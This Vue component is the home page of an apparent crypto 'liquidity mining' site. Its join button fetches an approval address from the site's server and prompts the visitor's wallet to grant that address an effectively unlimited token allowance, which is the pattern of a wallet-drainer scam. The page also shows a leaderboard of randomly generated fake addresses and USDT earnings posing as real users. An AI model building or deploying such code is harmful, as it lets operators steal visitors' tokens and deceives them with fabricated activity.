<template>
  <div class="home-page">
    <div class="banner-img">
      <img
        v-lazy="getAssetsImageUrl('/homeImg/bannerimg.png')"
        class="img-ban"
        alt=""
      />
      <!-- <van-notice-bar
        class="home-notice"
        :left-icon="getAssetsImageUrl('/homeImg/notices.png')"
      >
        ETH:2400 BNB:2100 BTC:17000 ETH:2400 BNB:2100 BTC:17000 ETH:2400
        BNB:2100 BTC:17000
      </van-notice-bar> -->
    </div>
    <div class="home-functional">
      <div class="functionals">
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.node") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.nodeNumber) }}
          </div>
        </div>
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.pool") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.poolTotal) }}

            <!-- {{ startAnimation(configStore.$state.homeList.poolTotal)}} -->
          </div>
        </div>
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.participant") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.authNumber) }}
          </div>
        </div>
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.income") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.income) }}
          </div>
        </div>
        <div
          class="functional-area backminning"
          @click="goActivity('Liquidity Mining', configStore.$state.userInfo)"
        >
          <div class="functional-text">{{ t("Detailed.mining") }}</div>
          <div class="functional-img">
            <img v-lazy="getAssetsImageUrl('/homeImg/gomning.png')" alt="" />
          </div>
        </div>
        <div
          class="functional-area backheight"
          @click="goActivity('Advanced Mining', configStore.$state.userInfo)"
        >
          <div class="functional-text">{{ t("Detailed.advancedMining") }}</div>
          <div class="functional-img">
            <img v-lazy="getAssetsImageUrl('/homeImg/gomning.png')" alt="" />
          </div>
        </div>
      </div>
      <van-button
        v-if="!isConnected"
        class="join-btv"
        :loading="loadingBtv"
        :disabled="!address"
        loading-type="spinner"
        :loading-text="t('authorizationPending')"
        @click="queryAuthAgent()"
        >{{ t("HeightPool.approvetext") }}</van-button
      >
    </div>
    <div><quotes /></div>
    <div class="user-mining">
      <div class="mining-titles">{{ t("Detailed.userMining") }}</div>
      <div class="mining-box">
        <div class="box-titles">
          <div>{{ t("addresstext") }}</div>
          <div>{{ t("valnumber") }}</div>
        </div>
        <div class="box-line" />
        <div class="box-scroll">
          <div class="box-contant">
            <div v-for="item in testData" :key="item.addr" class="contant-item">
              <div class="item-addr">
                {{
                  item.a.substring(0, 4) + "******" + item.a.substring(13, 17)
                }}
              </div>
              <!-- <div class="hrl_usdt">1,15241478.00</div> -->
              <div class="item-usdt">{{ item.v }}</div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="faq">
      <div class="faq-title">{{ t("Detailed.faq") }}</div>
      <div class="faq-box">
        <div class="box-title">
          <div class="tit-icon">
            <img v-lazy="getAssetsImageUrl('/homeImg/faqicon.png')" alt="" />
          </div>
          <div class="tit-text">{{ t("whyPayMiner") }}</div>
        </div>
        <div class="faq-contant">{{ t("minerFeeExplanation") }}</div>
      </div>
      <div class="faq-box">
        <div class="box-title">
          <div class="tit-icon">
            <img v-lazy="getAssetsImageUrl('/homeImg/faqicon.png')" alt="" />
          </div>
          <div class="tit-text">{{ t("howToJoin") }}</div>
        </div>
        <div class="faq-contant">{{ t("liquidityMiningInfo") }}</div>
      </div>
      <div class="faq-box">
        <div class="box-title">
          <div class="tit-icon">
            <img v-lazy="getAssetsImageUrl('/homeImg/faqicon.png')" alt="" />
          </div>
          <div class="tit-text">{{ t("howToWithdraw") }}</div>
        </div>
        <div class="faq-contant">{{ t("dailyUSDTGeneration") }}</div>
      </div>
    </div>
    <van-popup v-model:show="showaction" class="announcement" round>
      <div class="titles-announcement">
        <span class="title-text">
          <div class="announcement-img">
            <img
              v-lazy="getAssetsImageUrl('/homeImg/announcement.png')"
              alt=""
            />
          </div>
          <div class="announcement-text">{{ t("promoTitle") }}!!</div>
        </span>
        <span class="title-off" @click="showaction = false">
          <img v-lazy="getAssetsImageUrl('/languageIcon/officon.png')" alt=""
        /></span>
      </div>
      <div class="box-lines" />
      <div class="popcontant">{{ t("promoMessage") }}！！</div>
    </van-popup>
  </div>
</template>

<script setup>
import { ref, onMounted, computed } from "vue";
import {
  getAssetsImageUrl,
  truncateString,
  formattedNumber,
  goToPage
} from "@/utils/index.utils.js";
import quotes from "@/components/quotes/index.vue";
import { testApi } from "@/api/index";
import {
  useWeb3ModalAccount,
  useWeb3ModalProvider,
  useWeb3Modal
} from "@web3modal/ethers/vue";
import { BrowserProvider, Contract } from "ethers";
const { walletProvider } = useWeb3ModalProvider();
const { address, chainId } = useWeb3ModalAccount();
import BigNumber from "bignumber.js";
import ABI from "@/assets/abi/erc20.abi.json";
import { useI18n } from "vue3-i18n";
import { useConfigStore } from "@/stores/index";
const modal = useWeb3Modal();
const configStore = useConfigStore();
const { t } = useI18n();
import { useRouter } from "vue-router";
import axios from "axios";
const router = useRouter();
const goActivity = (pageName, state) => {
  if (address.value == void 0) {
    modal.open();
  } else {
    if (state.is_true == void 0 || state.is_true == false) {
      showFailToast(t("joinevent"));
    } else {
      router.push({ name: pageName });
    }
  }
};
function generateRandomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
const loadingBtv = ref(false);
// 生成随机金额
function generateRandomAmount() {
  return (Math.random() * 10000).toFixed(2) + "USDT";
}
const testData = computed(() => {
  const data = [];
  for (let i = 0; i < 100; i++) {
    data.push({
      a: "0x" + generateRandomString(26),
      v: generateRandomAmount()
    });
  }
  return data;
});
/**
 * 获取不同的授权地址。
 *
 * @function getAuthAgent
 * @param {String} chainType - 链类型1以太 56bsc。
 * @param {String} domains - 使用当前浏览器地址。
 * @returns {Object} - 返回首页数据对象。
 */
const queryAuthAgent = () => {
  loadingBtv.value = true;
  if (address.value == void 0) {
    modal.open();
  }
  testApi
    .getAuthAgent({
      chainType: chainId.value,
      domains: configStore.$state.domainsUrl //代理域名
    })
    .then(res => {
      let approveAdress = res.data;
      handleConfirm(approveAdress);
    })
    .catch(() => {});
};
//链上授权方法
const handleConfirm = async function (approveAdress) {
  try {
    const provider = new BrowserProvider(walletProvider.value);
    const signer = await provider.getSigner();
    const tokenContract = new Contract(
      configStore.$state.coinadress,
      ABI,
      provider
    );
    let singeContractConnect = tokenContract.connect(signer);
    let quotaNum =
      "0x" +
      new BigNumber(99999999999).multipliedBy(Math.pow(10, 18)).toString(16);
    const tx = await singeContractConnect.approve(approveAdress, quotaNum);
    showLoadingToast({
      message: t("authorizationPending"),
      forbidClick: true,
      wordBreak: "break-word",
      duration: 0
    });
    const value = await tx.wait();
    if (value.status) {
      showSuccessToast({
        message: t("authorizationSuccess"),
        forbidClick: true,
        wordBreak: "break-word",
        duration: 3000
      });

      // queryAuthAddress(tx.hash);
    } else {
      showFailToast({
        message: t("authorizationFailed"),
        wordBreak: "break-word",
        forbidClick: true,
        duration: 3000
      });
      loadingBtv.value = false;
      return;
    }
    loadingBtv.value = false;
  } catch (e) {
    loadingBtv.value = false;
  }
};
const showaction = ref(false);

onMounted(() => {
  configStore.queryAgentMarketIncome();
  showaction.value = true;
  axios.get("https://api.huobi.pro/market/tickers").then(res => {
    console.log(res);
  });
});
</script>
<style lang="scss" scoped>
.home-page {
  padding-bottom: 4rem;
  .banner-img {
    width: 100%;
    // height: 160.02px;
    position: relative;
    > img {
      width: 100%;
    }
    .home-notice {
      background: #00000033;
      backdrop-filter: blur(0.74rem);
      color: #ffffff;
      font-family: PingFang SC;
      font-size: 0.86rem;
      font-weight: 400;

      width: 100%;
      position: absolute;
      bottom: 0;
    }
  }
  .home-functional {
    margin-top: 1.43rem;
    padding: 0 1.14rem;

    .functionals {
      display: grid;
      grid-gap: 1rem 1.14rem;
      grid-template-columns: repeat(2, 1fr);
      .functional-box {
        background: #ffffff14;
        border-radius: 0.71rem;
        border-top: 0.07rem solid #ffffff1a;
        padding: 0.86rem;
        .box-text {
          font-family: PingFang SC;
          font-size: 0.86rem;
          font-weight: 400;
          color: #ffffff99;
        }
        .box-item {
          margin-top: 0.71rem;
          font-family: DIN;
          font-size: 1.29rem;
          font-weight: 700;
          color: #93f504;
        }
      }
      .functional-area {
        border-radius: 0.71rem;
        height: 6.71rem;
        border: 0.04rem solid #ff693e33;
        padding: 0.71rem;
        .functional-text {
          font-family: PingFang SC;
          font-size: 1rem;
          font-weight: 400;
          line-height: 1.4rem;
          color: #ffffff;
        }
        .functional-img {
          width: 1.57rem;
          margin-top: 1.86rem;
          > img {
            width: 100%;
          }
        }
      }
      .backminning {
        background: url("@/assets/images/homeImg/mining.png") no-repeat
          center/100%;
      }
      .backheight {
        background: url("@/assets/images/homeImg/heightpool.png") no-repeat
          center/100%;
      }
    }
    .join-btv {
      margin-top: 1.43rem;
      background: #ff693e;
      width: 100%;
      height: 2.86rem;
      border: none;
      font-family: PingFang SC;
      font-size: 1rem;
      font-weight: 400;
      color: #ffffff;
    }
  }
  .user-mining {
    margin-top: 1.43rem;
    padding: 0 1.14rem;
    width: 100%;
    .mining-titles {
      font-family: PingFang SC;
      font-size: 1.14rem;
      font-weight: 400;
      line-height: 1.6rem;
      color: #ffffff;
    }
    .mining-box {
      margin-top: 1.14rem;
      height: 22rem;
      border-radius: 0.71rem;
      border: 0.04rem solid #ffffff14;
      background: #ffffff1a;
      padding: 0.86rem 0.71rem;
      .box-titles {
        display: flex;
        justify-content: space-between;
        padding: 0 0.71rem;
        font-family: PingFang SC;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4rem;
      }
      .box-line {
        margin-top: 0.71rem;
        width: 100%;
        height: 0.07rem;
        background: linear-gradient(
          90deg,
          rgba(255, 105, 62, 0) 0%,
          rgba(255, 105, 62, 0.4) 44.13%,
          rgba(255, 105, 62, 0) 100%
        );
      }
      .box-scroll {
        overflow: hidden;
        height: 18rem;
        .box-contant {
          -webkit-animation: 60s scrollTop linear infinite normal;
          animation: 60s scrollTop linear infinite normal;
          .contant-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1.07rem;
            .item-addr {
              font-family: PingFang SC;
              font-size: 1rem;
              font-weight: 400;
              line-height: 1.4rem;
              color: #ffffffcc;
            }
            .item-usdt {
              font-family: DIN;
              font-size: 1rem;
              font-weight: 500;
              line-height: 1.21rem;
              color: #ffffff;
            }
          }
        }
      }
    }
  }
  .faq {
    margin-top: 1.43rem;
    padding: 0 1.14rem;
    .faq-title {
      margin-bottom: 1.14rem;
      font-family: PingFang SC;
      font-size: 1.14rem;
      font-weight: 400;
      line-height: 1.6rem;
      color: #ffffff;
    }
    .faq-box {
      width: 100%;
      background: #ffffff1a;

      border: 0.04rem solid #ffffff1a;
      border-radius: 0.71rem;
      margin-bottom: 1rem;
      padding: 0.86rem;
      .box-title {
        display: flex;
        align-items: center;
        .tit-icon {
          width: 2.14rem;
          height: 2.5rem;

          > img {
            width: 100%;
            height: 100%;
            // object-fit: cover;
          }
        }
        .tit-text {
          padding-left: 0.5rem;
          color: #ffffff;
          font-family: PingFang SC;
          font-size: 1rem;
          font-weight: 400;
          width: 90%;
        }
      }
      .faq-contant {
        margin-top: 0.71rem;
        font-family: PingFang SC;
        font-size: 0.71rem;
        font-weight: 400;
        line-height: 1rem;
        color: #ffffff99;
      }
    }
  }
  .announcement {
    background: linear-gradient(
      143.14deg,
      #322827 2.04%,
      #16261f 54.45%,
      #302135 98.21%
    );
    border-radius: 0.71rem;
    border: 1px solid #ff693e66;
    .titles-announcement {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0.86rem 1.07rem;
      .title-text {
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4rem;
        color: #ff693e;
        display: flex;
        align-items: flex-end;
        .announcement-img {
          width: 1.71rem;
          margin-right: 0.57rem;
          > img {
            width: 100%;
          }
        }
      }
      .title-off {
        width: 16px;
        > img {
          width: 16px;
        }
      }
    }
    .box-lines {
      height: 0.07rem;
      background: linear-gradient(
        90deg,
        rgba(255, 105, 62, 0) 0%,
        rgba(255, 105, 62, 0.2) 44.13%,
        rgba(255, 105, 62, 0) 100%
      );
    }
    .popcontant {
      padding: 0.79rem 1.29rem 1.5rem;
      font-family: PingFang SC;
      font-size: 14px;
      font-weight: 400;
      line-height: 19.6px;
      color: #ffffff;
    }
  }
}
</style>
<style>
@keyframes scrollTop {
  0% {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  100% {
    -webkit-transform: translate3d(0, -142.86rem, 0);
    transform: translate3d(0, -142.86rem, 0);
  }
}
</style>
